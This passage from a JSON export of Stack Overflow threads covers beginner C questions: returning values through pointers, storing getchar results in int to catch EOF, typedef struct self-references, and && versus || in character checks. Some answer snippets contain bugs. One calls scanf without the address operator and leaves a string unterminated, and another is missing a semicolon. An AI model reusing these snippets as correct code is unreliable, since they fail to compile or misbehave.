global variables, but as your program grows more complex, it will probably create more hassles for you then it is worth. </p>\n\n<p>If you use global variables to store your inputs inside the sub-function, then you can directly access them in your <code>main()</code> function to get the values. You won't be needing a <code>return</code> from your sub-function.</p>\n\n<p>Having said that, it would be better to change the function return type (maybe returning a <code>struct</code> containing the user-supplied values, if you more than one value to be returned) to match your requirements.</p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1447253217, "creation_date": 1447253217, "answer_id": 33653029, "question_id": 33652563, "link": "https://stackoverflow.com/questions/33652563/return-a-value-to-main-function-with-pointers/33653029#33653029", "title": "Return a value to main function with pointers", "body": "<p>If you want to read the values in <code>main</code> but check them (ex. make sure both are positive) in another function, you can do this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid check_numbers(int num1, int num2, int *valid) {\n    if ((num1 &gt; 0) &amp;&amp; (num2 &gt; 0)) {\n        *valid = 1;\n    } else {\n        *valid = 0;\n    }\n}\n\nint main(void) {\n    int num1, num2, total, valid;\n\n    printf(\"Enter both numbers: \");\n    scanf(\"%d\", num1);\n    scanf(\"%d\", num2);\n\n    check_numbers(num1, num2, &amp;valid);\n    if (valid) {\n        total = num1 + num2;\n        printf(\"%d \\n\", total);\n    } else {\n        printf(\"numbers are invalid\\n);\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "answer_count": 2, "score": -4, "last_activity_date": 1447253408, "creation_date": 1447251771, "question_id": 33652563, "link": "https://stackoverflow.com/questions/33652563/return-a-value-to-main-function-with-pointers", "title": "Return a value to main function with pointers", "body": "<p>Is there any other way to return a value to <code>main</code> function using <code>void</code> functions. I don't want to use the following way because I want to ask user to enters some values in main function and then check if those values are correct in the <code>void</code> function.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nvoid fun_1(int *num1, int *num2) {\n\n        printf(\"Enter both numbers: \");\n        scanf(\"%d\", num1);\n        scanf(\"%d\", num2);\n}\n\nint main(void) {\n\n        int num1, num2, total;\n\n        fun_1(&amp;num1, &amp;num2);\n\n        total = num1 + num2;\n\n        printf(\"%d \\n\", total);\n}\n</code></pre>\n\n<p>In this code we ask user to enter values in <code>void</code> function, but I would like to ask user to enter values in <code>main</code>!</p>\n"}, {"tags": ["c", "char", "eof"], "comments": [{"owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "edited": false, "score": 3, "creation_date": 1447253055, "post_id": 33652499, "comment_id": 55079170, "body": "The code <code>char c=0; printf(&quot;%d&quot;,c--);</code> prints <code>0</code> because <code>c</code> is decremented <b>after</b> its value is used in <code>printf()</code>. This code doesn&#39;t prove anything. Take a look at some <a href=\"http://en.cppreference.com/w/c/language/operator_incdec\" rel=\"nofollow noreferrer\">documentation</a>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447253662, "post_id": 33652499, "comment_id": 55079573, "body": "Post the code that &quot;never catches the EOF successfully&quot; rather than test code."}, {"owner": {"reputation": 133, "user_id": 4250879, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/0b9c5ea8149c6f1bfdc736b8fe66b119?s=128&d=identicon&r=PG&f=1", "display_name": "social_loser", "link": "https://stackoverflow.com/users/4250879/social-loser"}, "edited": false, "score": 0, "creation_date": 1447254084, "post_id": 33652499, "comment_id": 55079879, "body": "to axiac : I changed <code>c--</code> to <code>c-1</code> in my post."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1556340592, "post_id": 33652499, "comment_id": 98414102, "body": "you have many wrong assumptions: <code>char</code> can represent -1 if it&#39;s a signed type (which is the most common configuration). See <a href=\"https://stackoverflow.com/q/2054939/995714\">Is char signed or unsigned by default?</a>. And EOF can be any negative values. See <a href=\"https://stackoverflow.com/q/1624051/995714\">Is EOF always negative?</a>, <a href=\"https://stackoverflow.com/q/4569066/995714\">why in c language EOF IS -1?</a>"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447252984, "post_id": 33652664, "comment_id": 55079116, "body": "Furthermore, it&#39;s probably for the best to check <code>feof()</code> and <code>ferror()</code> after any read/write operation that returned unexpected values (like <code>EOF</code>)."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447253162, "post_id": 33652664, "comment_id": 55079239, "body": "@Rhymoid Checking for one of them is sufficient as <code>feof()</code> and <code>ferror()</code> cannot be raised at the same time as far as I know. Also, the error flag persists until it is cleared with <code>clearerr()</code>, an idiom is to continue reading the remainder of the data and then at the end checking the flags as to save a lot of error handling code."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447253240, "post_id": 33652664, "comment_id": 55079293, "body": "@chux Your remark is correct, but all actual characters are returned as positive values from <code>fgetc()</code> so a distinction can be made. I&#39;m going to edit my answer to incorporate this."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447253472, "post_id": 33652664, "comment_id": 55079447, "body": "@chux Better this way?"}], "tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": false, "score": 5, "last_activity_date": 1447253412, "last_edit_date": 1447253412, "creation_date": 1447252137, "answer_id": 33652664, "question_id": 33652499, "link": "https://stackoverflow.com/questions/33652499/why-is-eof-defined-to-be-%e2%88%921-when-%e2%88%921-cannot-be-represented-in-a-char/33652664#33652664", "title": "Why is EOF defined to be \u22121 when \u22121 cannot be represented in a char?", "body": "<p>You need to store the character read by <code>fgetc()</code>, <code>getchar()</code>, etc. in an <code>int</code> so you can catch the <code>EOF</code>. This is well-known and has always been the case everywhere. <code>EOF</code> must be distinguishable from all proper characters, so it was decided that functions like <code>fgetc()</code> return valid characters as non-negative values (even if <code>char</code> is signed). An end-of-file condition is signalled by <code>-1</code>, which is negative and thus cannot collide with any valid character <code>fgetc()</code> could return.</p>\n\n<p>Do not edit the system headers and especially do not change the value of constants defined there. If you do that, you break these headers. Notice that even if you change the value of <code>EOF</code> in the headers, this won't change the value functions like <code>fgetc()</code> return on end-of-file or error, it just makes <code>EOF</code> have the wrong value.</p>\n"}, {"tags": [], "owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "is_accepted": false, "score": 2, "last_activity_date": 1447252518, "creation_date": 1447252518, "answer_id": 33652798, "question_id": 33652499, "link": "https://stackoverflow.com/questions/33652499/why-is-eof-defined-to-be-%e2%88%921-when-%e2%88%921-cannot-be-represented-in-a-char/33652798#33652798", "title": "Why is EOF defined to be \u22121 when \u22121 cannot be represented in a char?", "body": "<blockquote>\n  <p>Why is EOF defined to be \u22121 when \u22121 cannot be represented in a char?</p>\n</blockquote>\n\n<p>Because <code>EOF</code> isn't a character but a state.</p>\n"}, {"tags": [], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "is_accepted": false, "score": 2, "last_activity_date": 1447253106, "creation_date": 1447253106, "answer_id": 33652991, "question_id": 33652499, "link": "https://stackoverflow.com/questions/33652499/why-is-eof-defined-to-be-%e2%88%921-when-%e2%88%921-cannot-be-represented-in-a-char/33652991#33652991", "title": "Why is EOF defined to be \u22121 when \u22121 cannot be represented in a char?", "body": "<blockquote>\n  <p>If I changed the EOF value in stdio.h manually, will there be further\n  problems?</p>\n</blockquote>\n\n<p>Absolutely, since you would be effectively breaking the header entirely. A header is not an actual function, just a set of prototypes and declarations for functions that are defined elsewhere ABSOLUTELY DO NOT change system headers, you will never succeed in doing anything but breaking your code, project and/or worse things.</p>\n\n<p>On the subject of EOF: EOF is not a character, and thus cannot be represented in a character variable. To get around this, most programmers simple use an int value (by default signed) that can interpret the -1 from EOF. The reason that EOF can never be a character is because otherwise there would be one character indistinguishable from the end of file indicator.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1447259047, "last_edit_date": 1447259047, "creation_date": 1447256480, "answer_id": 33654195, "question_id": 33652499, "link": "https://stackoverflow.com/questions/33652499/why-is-eof-defined-to-be-%e2%88%921-when-%e2%88%921-cannot-be-represented-in-a-char/33654195#33654195", "title": "Why is EOF defined to be \u22121 when \u22121 cannot be represented in a char?", "body": "<p><code>int</code> versus <code>char</code>.</p>\n\n<p><code>fgetc()</code> returns an <code>int</code>, not <code>char</code>.  The values returned are in the range of <code>unsigned char</code> and <code>EOF</code>.  This is typically 257 different values.  So saving the result in <code>char, signed char, unsigned char</code> will lose some distinguishably.</p>\n\n<p>Instead save the <code>fgetc()</code> return value in an <code>int</code>.  <em>After</em> testing for an <code>EOF</code> result, the value can be saved as a <code>char</code> if needed.</p>\n\n<pre><code>// char c;\nint c;\n...\nwhile ((c=getchar())!=EOF&amp;&amp;i&lt;50) {\n  char ch = c;\n  ...\n</code></pre>\n\n<hr>\n\n<p>Detail: \"Why is <code>EOF</code> defined to be \u22121 when \u22121 cannot be represented in a <code>char</code>?\" misleads.  On systems where <code>char</code> is signed and <code>EOF == -1</code>, a <code>char</code> <em>can</em> have the value of <code>EOF</code>.  Yet on such systems, a <code>char</code> can have a value of -1 that represents a character too - they overlap.  So a <code>char</code> cannot distinctively represent all <code>char</code> and <code>EOF</code>.  Best to use an <code>int</code> to save the return value of <code>fgetc()</code>.</p>\n\n<blockquote>\n  <p>... the fgetc function obtains that character as an <code>unsigned char</code> converted to an <code>int</code> and ...<br>\n  If the end-of-file indicator for the stream is set, or if the stream is at end-of-file, ... and the fgetc function returns <code>EOF</code>. ...  C11 \u00a77.21.7.1 2-3</p>\n</blockquote>\n"}], "owner": {"reputation": 133, "user_id": 4250879, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/0b9c5ea8149c6f1bfdc736b8fe66b119?s=128&d=identicon&r=PG&f=1", "display_name": "social_loser", "link": "https://stackoverflow.com/users/4250879/social-loser"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 197, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1447259047, "creation_date": 1447251555, "last_edit_date": 1447257324, "question_id": 33652499, "link": "https://stackoverflow.com/questions/33652499/why-is-eof-defined-to-be-%e2%88%921-when-%e2%88%921-cannot-be-represented-in-a-char", "title": "Why is EOF defined to be \u22121 when \u22121 cannot be represented in a char?", "body": "<p>I'm learning the C programming on a raspberry pi, however I found that my program never catches the EOF successfully. I use <code>char c=0; printf(\"%d\",c-1);</code> to test the <code>char</code> type, finding that the <code>char</code> type ranges from 0 to 255, as an <code>unsigned short</code>. but the <code>EOF</code> defined in <code>stdio.h</code> is (-1). So is the wrong cc package installed on my Pi? how can I fix it? If I changed the <code>EOF</code> value in <code>stdio.h</code> manually, will there be further problems?</p>\n\n<hr>\n\n<p>what worries me is that ,when I learning from the K&amp;R book, there are examples which use code like <code>while ((c=getchar())!=EOF)</code>, I followed that on my Ubuntu machine and it works fine. I just wonder if such kind of syntax is abandoned by modern C practice or there is something conflict in my Raspberry Pi?</p>\n\n<p>here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main( void )\n{\n        char c;\n        int i=0;\n        while ((c=getchar())!=EOF&amp;&amp;i&lt;50) {\n                putchar(c);\n                i++;\n        }\n        if (c==EOF)\n                printf(\"\\nEOF got.\\n\");\n        while ((c=getchar())!=EOF&amp;&amp;i&lt;500) {\n                printf(\"%d\",c);\n                i++;\n        }\n}\n</code></pre>\n\n<p>even when I redirect the input to an file, it keeps printing 255 on the screen, never terminate this program.</p>\n\n<hr>\n\n<p>Finally I found that I'm wrong,In the K&amp;R book, it defined c as an int, not a  char. Problem solved.</p>\n"}, {"tags": ["c", "arrays", "shell", "pointers", "struct"], "answers": [{"tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": true, "score": 5, "last_activity_date": 1447251550, "last_edit_date": 1447251550, "creation_date": 1447250794, "answer_id": 33652273, "question_id": 33652201, "link": "https://stackoverflow.com/questions/33652201/why-produces-this-code-a-assignment-from-incompatible-pointertype-warning/33652273#33652273", "title": "Why produces this code a &quot;assignment from incompatible pointertype&quot; warning?", "body": "<pre><code> typedef struct\n {\n    struct Pargs* next;         \n    char* command;\n    char* args[11];\n} Pargs;\n</code></pre>\n\n<p>You refer to typedef <code>Pargs</code> inside struct itself . That won't work as it is a pointer to incomplete type and you can't refer to it , until you give complete definition.</p>\n\n<p>You can do this instead -</p>\n\n<pre><code>typedef struct name                // give any desired name to structure\n{\n     struct name *next;             //use struct's name to declare pointer next\n     char* command;\n     char* args[11];\n} Pargs;\n</code></pre>\n"}], "owner": {"reputation": 235, "user_id": 4222843, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/f8be74f73eb7241ef2204b88c79e8b92?s=128&d=identicon&r=PG&f=1", "display_name": "student96", "link": "https://stackoverflow.com/users/4222843/student96"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 33652273, "answer_count": 1, "score": 2, "last_activity_date": 1447251550, "creation_date": 1447250545, "question_id": 33652201, "link": "https://stackoverflow.com/questions/33652201/why-produces-this-code-a-assignment-from-incompatible-pointertype-warning", "title": "Why produces this code a &quot;assignment from incompatible pointertype&quot; warning?", "body": "<p>I'm writing a shell at my own and I'm always getting this warning \"assignment from incompatible pointertype\" for the following code(just the important lines)</p>\n\n<pre><code>if (first_struct == NULL)\n            {\n                first_struct = &amp;parg;\n            }\n            else\n            {\n\n                Pargs** temp = first_struct;\n                while ((*temp)-&gt;next != NULL)\n                    temp = &amp;((*temp)-&gt;next);&lt;--incompatible pointer type\n                (*temp)-&gt;next = parg;&lt;--incompatible pointer type\n\n            }\n            parg-&gt;next = NULL;\n</code></pre>\n\n<p>For me there are just the same pointer types.</p>\n\n<p>Here is the code for the struct:</p>\n\n<pre><code>    typedef struct\n{\n    struct Pargs* next;\n    char* command;\n    char* args[11];\n} Pargs;\n</code></pre>\n\n<p>The struct was declared a few lines above:</p>\n\n<pre><code>Pargs* parg = malloc(sizeof (Pargs));\n</code></pre>\n\n<p>Maybe I do not see my own fails, but I look at this lines since hours and I have no idea why this should be not correct.</p>\n\n<p>PS: If anyone needs more code or information, please do not hesitate to ask, I have many more of them ;)</p>\n"}, {"tags": ["c", "loops", "while-loop", "char", "compare"], "comments": [{"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 2, "creation_date": 1447250127, "post_id": 33652038, "comment_id": 55077303, "body": "What do you mean with \u201cit doesn&#39;t work?\u201d That&#39;s not an error description. What happens and what did you expect to happen?"}, {"owner": {"reputation": 57, "user_id": 3057880, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/cbUhm.jpg?s=128&g=1", "display_name": "Anonymous", "link": "https://stackoverflow.com/users/3057880/anonymous"}, "reply_to_user": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447250245, "post_id": 33652038, "comment_id": 55077379, "body": "@FUZxxl like it does not let me accept any letters. Like I can type in anything and it will still print that the letter is not valid. It is meant to accept a, d, w and x. And return it back from the method."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 2, "creation_date": 1447250320, "post_id": 33652038, "comment_id": 55077415, "body": "You want to use <code>&amp;&amp;</code> not <code>||</code>. Run through your code with a simple example (such as input <code>a</code>) in a debugger or with a pen &amp; paper. At some point, you need to learn to debug too."}, {"owner": {"reputation": 57, "user_id": 3057880, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/cbUhm.jpg?s=128&g=1", "display_name": "Anonymous", "link": "https://stackoverflow.com/users/3057880/anonymous"}, "reply_to_user": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 0, "creation_date": 1447250590, "post_id": 33652038, "comment_id": 55077572, "body": "@BlueMoon Thank you that worked :)"}], "answers": [{"comments": [{"owner": {"reputation": 57, "user_id": 3057880, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/cbUhm.jpg?s=128&g=1", "display_name": "Anonymous", "link": "https://stackoverflow.com/users/3057880/anonymous"}, "edited": false, "score": 0, "creation_date": 1447250542, "post_id": 33652122, "comment_id": 55077555, "body": "Thanks the &#39;&amp;&amp;&#39; worked. See the way I was thinking about it is that while the letter is not equal to either a OR d OR w Or x then ask for the letter again. Thanks again for the solution :)"}], "tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": true, "score": 2, "last_activity_date": 1447251747, "last_edit_date": 1447251747, "creation_date": 1447250329, "answer_id": 33652122, "question_id": 33652038, "link": "https://stackoverflow.com/questions/33652038/how-can-i-compare-a-char-to-different-letters-in-c/33652122#33652122", "title": "How can I compare a char to different letters in C?", "body": "<p>You want to use <code>&amp;&amp;</code> instead of <code>||</code> for your comparisons. Think about it: <code>letter</code> is always unequal to <code>'a'</code> or unequal to <code>d</code>. If your letter is an a, it's still unequal to b, so it's unequal to a or unequal to b. What you want is a letter that is neither equal to <code>'a'</code>, nor equal to <code>'d'</code>, nor etc. Notice that neither &alpha; nor &beta; is not the same thing as not (&alpha; or &beta;).</p>\n\n<p>It's also a good idea to either give <code>letter</code> an initial value (one you don't want, like <code>'a'</code>) or to use a <code>do</code>-<code>while</code> loop like this:</p>\n\n<pre><code>do {\n    printf(\"NEW MOVEMENT: Enter a valid command by keyword:\\n\");\n    printf(\"Valid commands: a d w x\\n\");\n    scanf(\" %c\", &amp;letter);\n} while (letter != 'a' &amp;&amp; letter != 'd' &amp;&amp; letter != 'w' &amp;&amp; letter != 'x');\n</code></pre>\n\n<p>Alternatively, you can use <code>strchr</code> for this purpose:</p>\n\n<pre><code>while (strchr(\"adwx\", letter) == NULL)\n</code></pre>\n\n<p>Don't forget to <code>#include &lt;string.h&gt;</code> when you use <code>strchr</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "is_accepted": false, "score": 1, "last_activity_date": 1447250718, "creation_date": 1447250718, "answer_id": 33652254, "question_id": 33652038, "link": "https://stackoverflow.com/questions/33652038/how-can-i-compare-a-char-to-different-letters-in-c/33652254#33652254", "title": "How can I compare a char to different letters in C?", "body": "<pre><code>while(letter != 'a' || letter != 'd' || letter != 'w' || letter != 'x'){\n</code></pre>\n\n<p>Is a loop that will never end. You probably wanted the logical AND instead of the logical OR. </p>\n\n<p>AND in C is represented with <code>&amp;&amp;</code>\nOR in C is represented with <code>||</code></p>\n\n<p>Thus, you should modify your code to this:</p>\n\n<pre><code>while(letter != 'a' &amp;&amp; letter != 'd' &amp;&amp; letter != 'w' &amp;&amp; letter != 'x'){\n</code></pre>\n\n<p>This means WHILE <code>letter</code> is NEITHER <code>d</code>, NOR <code>w</code>, NOR <code>x</code></p>\n\n<p>Your original means:</p>\n\n<p>WHILE letter is EITHER NOT <code>d</code> OR NOT <code>x</code> OR NOT <code>w</code></p>\n\n<p>Which is always true since something cannot be <code>d</code>, <code>x</code> and <code>w</code> at the same time</p>\n"}, {"comments": [{"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447251649, "post_id": 33652397, "comment_id": 55078264, "body": "Have you downvoted me? Have you actually <i>checked</i> that the solution with <code>&amp;&amp;</code> doesn&#39;t work?"}, {"owner": {"reputation": 545, "user_id": 5550456, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c902f5f0b3b43316793753b39bb4c153?s=128&d=identicon&r=PG&f=1", "display_name": "Yuriko", "link": "https://stackoverflow.com/users/5550456/yuriko"}, "reply_to_user": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 1, "creation_date": 1447251800, "post_id": 33652397, "comment_id": 55078371, "body": "No I didn&#39;t. Also I don&#39;t think I have the reputation to do it."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447251835, "post_id": 33652397, "comment_id": 55078401, "body": "<code>while (letter != letter_you_want)</code> does work, the loop is executed until the letter is equal to <code>letter_you_want</code>, which is exactly the behaviour OP wants. I assume OPs first example was the case where there is only one thing he wants to compare to."}, {"owner": {"reputation": 545, "user_id": 5550456, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c902f5f0b3b43316793753b39bb4c153?s=128&d=identicon&r=PG&f=1", "display_name": "Yuriko", "link": "https://stackoverflow.com/users/5550456/yuriko"}, "reply_to_user": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447251916, "post_id": 33652397, "comment_id": 55078462, "body": "Indeed, but I find the code cleaner using <code>strchr</code> as you did."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447252010, "post_id": 33652397, "comment_id": 55078525, "body": "Except that the <code>strchr()</code> method actually has a subtle and somewhat unimportant bug: If <code>letter</code> is <code>\\0</code>, <code>strchr()</code> will not return a null pointer but rather a pointer to the terminating <code>\\0</code> byte. <code>memchr()</code> would be correct but this distinction is a bit confusing for a beginner so I left it out."}], "tags": [], "owner": {"reputation": 545, "user_id": 5550456, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c902f5f0b3b43316793753b39bb4c153?s=128&d=identicon&r=PG&f=1", "display_name": "Yuriko", "link": "https://stackoverflow.com/users/5550456/yuriko"}, "is_accepted": false, "score": 2, "last_activity_date": 1447252509, "last_edit_date": 1447252509, "creation_date": 1447251243, "answer_id": 33652397, "question_id": 33652038, "link": "https://stackoverflow.com/questions/33652038/how-can-i-compare-a-char-to-different-letters-in-c/33652397#33652397", "title": "How can I compare a char to different letters in C?", "body": "<p>I assume <code>ask_for_command()</code> asks the user to choose between <code>a</code>, <code>d</code>, <code>w</code> and <code>x</code>.</p>\n\n<h2>Why none of your solution works</h2>\n\n<p>It won't work if you write:</p>\n\n<pre><code>while(letter != 'a' || letter != 'd' || letter != 'w' || letter != 'x')\n</code></pre>\n\n<p>Indeed, imagine what happens if the user choose <code>w</code> (for example):</p>\n\n<pre><code>letter != 'a' -&gt; TRUE\nletter != 'd' -&gt; TRUE\nletter != 'w' -&gt; FALSE\nletter != 'x' -&gt; TRUE\n</code></pre>\n\n<p>Thus, the statement is:</p>\n\n<pre><code>while (TRUE || TRUE ||\u00a0TRUE || FALSE ||\u00a0TRUE) # You will enter the loop\n</code></pre>\n\n<p>The same thing happens if you choose <code>a</code>, <code>d</code> or <code>x</code> instead of <code>w</code>.</p>\n\n<p>It won't work either if you write</p>\n\n<pre><code>while(letter != 'a')\n</code></pre>\n\n<p>Indeed, if the user type <code>w</code>, the statement is <code>true</code> (<code>w != a</code>) and you will enter the loop.</p>\n\n<h2>What you should do</h2>\n\n<p>Do an infinite loop with <code>while</code>. As long as the user doesn't provide a valid command, you keep him inside:</p>\n\n<pre><code>char ask_for_command(){\n    // Valid commands\n    char commands[] = \"awxd\"\n    char letter;\n    printf(\"Command: \");\n\n    while (1) {\n        // You ask for the command\n        scanf(\" %c\", &amp;letter);\n\n        // Is it a valid command? If so, we can return it\n        if (memchr(commands, letter, strlen(commands)) != NULL)\n            return letter;\n\n        // It looks like the command given was invalid! \n        printf(\"NEW MOVEMENT: Enter a valid command by keyword:\\n\");\n        printf(\"Valid commands: a d w x\\n\");\n    }\n}\n</code></pre>\n\n<p>EDIT: Using <code>memchr</code>, as FUZxxl mentioned in comments.</p>\n"}], "owner": {"reputation": 57, "user_id": 3057880, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/cbUhm.jpg?s=128&g=1", "display_name": "Anonymous", "link": "https://stackoverflow.com/users/3057880/anonymous"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 33652122, "answer_count": 3, "score": 0, "last_activity_date": 1447252509, "creation_date": 1447250037, "last_edit_date": 1447251646, "question_id": 33652038, "link": 